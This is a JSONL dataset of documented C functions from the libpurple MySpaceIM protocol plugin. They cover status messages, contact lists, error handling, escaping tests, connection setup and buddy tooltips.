{"docstring": "/**\n * Process incoming status mood messages.\n *\n * @param session\n * @param msg Status mood update message. Caller frees.\n *\n * @return TRUE if successful.\n */\n", "func_signal": "static gboolean\nmsim_incoming_status_mood(MsimSession *session, MsimMessage *msg)", "code": "{\n\t/* TODO: I dont know too much about this yet,\n\t * so until I see how the official client handles\n\t * this and decide if libpurple should as well,\n\t * well just say we used it\n\t */\n\tgchar *ss;\n\tss = msim_msg_get_string(msg, \"msg\");\n\tpurple_debug_info(\"msim\", \"Incoming Status Message: %s\", ss ? ss : \"(NULL)\");\n\tg_free(ss);\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Get contact list, calling msim_got_contact_list() with\n * what_to_do_after as user_data gpointer.\n *\n * @param what_to_do_after should be one of the MSIM_CONTACT_LIST_* #defines.\n */\n", "func_signal": "static gboolean\nmsim_get_contact_list(MsimSession *session, int what_to_do_after)", "code": "{\n\treturn msim_send(session,\n\t\t\t\"persist\", MSIM_TYPE_INTEGER, 1,\n\t\t\t\"sesskey\", MSIM_TYPE_INTEGER, session->sesskey,\n\t\t\t\"cmd\", MSIM_TYPE_INTEGER, MSIM_CMD_GET,\n\t\t\t\"dsn\", MSIM_TYPE_INTEGER, MG_LIST_ALL_CONTACTS_DSN,\n\t\t\t\"lid\", MSIM_TYPE_INTEGER, MG_LIST_ALL_CONTACTS_LID,\n\t\t\t\"uid\", MSIM_TYPE_INTEGER, session->userid,\n\t\t\t\"rid\", MSIM_TYPE_INTEGER,\n\t\t\t\tmsim_new_reply_callback(session, msim_got_contact_list, GUINT_TO_POINTER(what_to_do_after)),\n\t\t\t\"body\", MSIM_TYPE_STRING, g_strdup(\"\"),\n\t\t\tNULL);\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Handle an error from the server.\n *\n * @param session\n * @param msg The message.\n *\n * @return TRUE if successfully reported error.\n */\n", "func_signal": "static gboolean\nmsim_error(MsimSession *session, MsimMessage *msg)", "code": "{\n\tgchar *errmsg, *full_errmsg;\n\tguint err;\n\n\tg_return_val_if_fail(msg != NULL, FALSE);\n\n\terr = msim_msg_get_integer(msg, \"err\");\n\terrmsg = msim_msg_get_string(msg, \"errmsg\");\n\n\tfull_errmsg = g_strdup_printf(_(\"Protocol error, code %d: %s\"), err,\n\t\t\terrmsg ? errmsg : \"no 'errmsg' given\");\n\n\tg_free(errmsg);\n\n\tpurple_debug_info(\"msim\", \"msim_error (sesskey=%d): %s\\n\",\n\t\t\tsession->sesskey, full_errmsg);\n\n\t/* Destroy session if fatal. */\n\tif (msim_msg_get(msg, \"fatal\")) {\n\t\tPurpleConnectionError reason = PURPLE_CONNECTION_ERROR_NETWORK_ERROR;\n\t\tpurple_debug_info(\"msim\", \"fatal error, closing\\n\");\n\n\t\tswitch (err) {\n\t\t\tcase MSIM_ERROR_INCORRECT_PASSWORD: /* Incorrect password */\n\t\t\t\treason = PURPLE_CONNECTION_ERROR_AUTHENTICATION_FAILED;\n\t\t\t\tif (!purple_account_get_remember_password(session->account))\n\t\t\t\t\tpurple_account_set_password(session->account, NULL);\n#ifdef MSIM_MAX_PASSWORD_LENGTH\n\t\t\t\tif (session->account->password && (strlen(session->account->password) > MSIM_MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\tgchar *suggestion;\n\n\t\t\t\t\tsuggestion = g_strdup_printf(_(\"%s Your password is \"\n\t\t\t\t\t\t\t\"%zu characters, which is longer than the \"\n\t\t\t\t\t\t\t\"maximum length of %d.  Please shorten your \"\n\t\t\t\t\t\t\t\"password at http://profileedit.myspace.com/index.cfm?fuseaction=accountSettings.changePassword and try again.\"),\n\t\t\t\t\t\t\tfull_errmsg,\n\t\t\t\t\t\t\tstrlen(session->account->password),\n\t\t\t\t\t\t\tMSIM_MAX_PASSWORD_LENGTH);\n\n\t\t\t\t\t/* Replace full_errmsg. */\n\t\t\t\t\tg_free(full_errmsg);\n\t\t\t\t\tfull_errmsg = suggestion;\n\t\t\t\t} else {\n\t\t\t\t\tg_free(full_errmsg);\n\t\t\t\t\tfull_errmsg = g_strdup(_(\"Incorrect username or password\"));\n\t\t\t\t}\n#endif\n\t\t\t\tbreak;\n\t\t\tcase MSIM_ERROR_LOGGED_IN_ELSEWHERE: /* Logged in elsewhere */\n\t\t\t\treason = PURPLE_CONNECTION_ERROR_NAME_IN_USE;\n\t\t\t\tif (!purple_account_get_remember_password(session->account))\n\t\t\t\t\tpurple_account_set_password(session->account, NULL);\n\t\t\t\tbreak;\n\t\t}\n\t\tpurple_connection_error_reason(session->gc, reason, full_errmsg);\n\t} else {\n\t\tpurple_notify_error(session->account, _(\"MySpaceIM Error\"), full_errmsg, NULL);\n\t}\n\n\tg_free(full_errmsg);\n\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Test protocol-level escaping/unescaping.\n */\n", "func_signal": "static int\nmsim_test_escaping(void)", "code": "{\n\tguint failures;\n\tgchar *raw, *escaped, *unescaped, *expected;\n\n\tfailures = 0;\n\n\tpurple_debug_info(\"msim\", \"\\n\\nTesting escaping\\n\");\n\n\traw = \"hello/world\\\\hello/world\";\n\n\tescaped = msim_escape(raw);\n\tpurple_debug_info(\"msim\", \"msim_test_escaping: raw=%s, escaped=%s\\n\", raw, escaped);\n\texpected = \"hello/1world/2hello/1world\";\n\tif (!g_str_equal(escaped, expected)) {\n\t\tpurple_debug_info(\"msim\", \"!!!(%d), msim_escape failed: %s != %s\\n\",\n\t\t\t\t++failures, escaped, expected);\n\t}\n\n\n\tunescaped = msim_unescape(escaped);\n\tg_free(escaped);\n\tpurple_debug_info(\"msim\", \"msim_test_escaping: unescaped=%s\\n\", unescaped);\n\tif (!g_str_equal(raw, unescaped)) {\n\t\tpurple_debug_info(\"msim\", \"!!!(%d), msim_unescape failed: %s != %s\\n\",\n\t\t\t\t++failures, raw, unescaped);\n\t}\n\n\treturn failures;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process an incoming \"unofficial client\" message. The plugin for\n * Miranda IM sends this message with the plugin information.\n */\n", "func_signal": "static gboolean\nmsim_incoming_unofficial_client(MsimSession *session, MsimMessage *msg)", "code": "{\n\tMsimUser *user;\n\tgchar *username, *client_info;\n\n\tusername = msim_msg_get_string(msg, \"_username\");\n\tclient_info = msim_msg_get_string(msg, \"msg\");\n\n\tg_return_val_if_fail(username != NULL, FALSE);\n\tg_return_val_if_fail(client_info != NULL, FALSE);\n\n\tpurple_debug_info(\"msim\", \"msim_incoming_unofficial_client: %s is using client %s\\n\",\n\t\tusername, client_info);\n\n\tuser = msim_find_user(session, username);\n\n\tg_return_val_if_fail(user != NULL, FALSE);\n\n\tif (user->client_info) {\n\t\tg_free(user->client_info);\n\t}\n\tuser->client_info = client_info;\n\n\tg_free(username);\n\t/* Do not free client_info - the MsimUser now owns it. */\n\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Callback when connected. Sets up input handlers.\n *\n * @param data A PurpleConnection pointer.\n * @param source File descriptor.\n * @param error_message\n */\n", "func_signal": "static void\nmsim_connect_cb(gpointer data, gint source, const gchar *error_message)", "code": "{\n\tPurpleConnection *gc;\n\tMsimSession *session;\n\n\tg_return_if_fail(data != NULL);\n\n\tgc = (PurpleConnection *)data;\n\tsession = (MsimSession *)gc->proto_data;\n\n\tif (source < 0) {\n\t\tgchar *tmp = g_strdup_printf(_(\"Unable to connect: %s\"),\n\t\t\t\terror_message);\n\t\tpurple_connection_error_reason (gc,\n\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR, tmp);\n\t\t\tg_free(tmp);\n\t\treturn;\n\t}\n\n\tsession->fd = source;\n\n\tgc->inpa = purple_input_add(source, PURPLE_INPUT_READ, msim_input_cb, gc);\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Postprocess and send a message.\n *\n * @param session\n * @param msg Message to postprocess. Will NOT be freed.\n * @param username Username to resolve. Assumed to be a static string (will not be freed or copied).\n * @param uid_field_name Name of new field to add, containing uid of username. Static string.\n * @param uid_before Name of existing field to insert username field before. Static string.\n *\n * @return TRUE if successful.\n */\n", "func_signal": "static gboolean\nmsim_postprocess_outgoing(MsimSession *session, MsimMessage *msg,\n\t\tconst gchar *username, const gchar *uid_field_name,\n\t\tconst gchar *uid_before)", "code": "{\n\tPurpleBuddy *buddy;\n\tguint uid;\n\tgboolean rc;\n\n\tg_return_val_if_fail(msg != NULL, FALSE);\n\n\t/* Store information for msim_postprocess_outgoing_cb(). */\n\tmsg = msim_msg_append(msg, \"_username\", MSIM_TYPE_STRING, g_strdup(username));\n\tmsg = msim_msg_append(msg, \"_uid_field_name\", MSIM_TYPE_STRING, g_strdup(uid_field_name));\n\tmsg = msim_msg_append(msg, \"_uid_before\", MSIM_TYPE_STRING, g_strdup(uid_before));\n\n\t/* First, try the most obvious. If numeric userid is given, use that directly. */\n\tif (msim_is_userid(username)) {\n\t\tuid = atol(username);\n\t} else {\n\t\t/* Next, see if on buddy list and know uid. */\n\t\tbuddy = purple_find_buddy(session->account, username);\n\t\tif (buddy) {\n\t\t\tuid = purple_blist_node_get_int(PURPLE_BLIST_NODE(buddy), \"UserID\");\n\t\t} else {\n\t\t\tuid = 0;\n\t\t}\n\n\t\tif (!buddy || !uid) {\n\t\t\t/* Don't have uid offhand - need to ask for it, and wait until hear back before sending. */\n\t\t\tpurple_debug_info(\"msim\", \">>> msim_postprocess_outgoing: couldn't find username %s in blist\\n\",\n\t\t\t\t\tusername ? username : \"(NULL)\");\n\t\t\tmsim_lookup_user(session, username, msim_postprocess_outgoing_cb, msim_msg_clone(msg));\n\t\t\treturn TRUE;       /* not sure of status yet - haven't sent! */\n\t\t}\n\t}\n\n\t/* Already have uid, postprocess and send msg immediately. */\n\tpurple_debug_info(\"msim\", \"msim_postprocess_outgoing: found username %s has uid %d\\n\",\n\t\t\tusername ? username : \"(NULL)\", uid);\n\n\tmsg = msim_do_postprocessing(msg, uid_before, uid_field_name, uid);\n\n\trc = msim_msg_send(session, msg);\n\n\t/* TODO: free\n\t * msim_msg_free(msg);\n\t */\n\n\treturn rc;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process unrecognized information.\n *\n * @param session\n * @param msg An MsimMessage that was unrecognized, or NULL.\n * @param note Information on what was unrecognized, or NULL.\n */\n", "func_signal": "void\nmsim_unrecognized(MsimSession *session, MsimMessage *msg, gchar *note)", "code": "{\n\t/* TODO: Some more context, outwardly equivalent to a backtrace,\n\t * for helping figure out what this msg is for. What was going on?\n\t * But not too much information so that a user\n\t * posting this dump reveals confidential information.\n\t */\n\n\t/* TODO: dump unknown msgs to file, so user can send them to me\n\t * if they wish, to help add support for new messages (inspired\n\t * by Alexandr Shutko, who maintains OSCAR protocol documentation).\n\t *\n\t * Filed enhancement ticket for libpurple as #4688.\n\t */\n\n\tpurple_debug_info(\"msim\", \"Unrecognized data on account for %s\\n\",\n\t\t\t(session && session->account && session->account->username) ?\n\t\t\tsession->account->username : \"(NULL)\");\n\tif (note) {\n\t\tpurple_debug_info(\"msim\", \"(Note: %s)\\n\", note);\n\t}\n\n\tif (msg) {\n\t\tmsim_msg_dump(\"Unrecognized message dump: %s\\n\", msg);\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Obtain the tooltip text for a buddy.\n *\n * @param buddy Buddy to obtain tooltip text on.\n * @param user_info Variable modified to have the tooltip text.\n * @param full TRUE if should obtain full tooltip text.\n */\n", "func_signal": "static void\nmsim_tooltip_text(PurpleBuddy *buddy, PurpleNotifyUserInfo *user_info,\n\t\tgboolean full)", "code": "{\n\tMsimUser *user;\n\n\tg_return_if_fail(buddy != NULL);\n\tg_return_if_fail(user_info != NULL);\n\n\tuser = msim_get_user_from_buddy(buddy, TRUE);\n\n\tif (PURPLE_BUDDY_IS_ONLINE(buddy)) {\n\t\tMsimSession *session;\n\t\tPurpleAccount *account = purple_buddy_get_account(buddy);\n\t\tPurpleConnection *gc = purple_account_get_connection(account);\n\n\t\tsession = (MsimSession *)gc->proto_data;\n\n\t\t/* TODO: if (full), do something different? */\n\n\t\t/* TODO: request information? have to figure out how to do\n\t\t * the asynchronous lookup like oscar does (tooltip shows\n\t\t * 'retrieving...' if not yet available, then changes when it is).\n\t\t *\n\t\t * Right now, only show what we have on hand.\n\t\t */\n\n\t\t/* Show abbreviated user info. */\n\t\tmsim_append_user_info(session, user_info, user, FALSE);\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
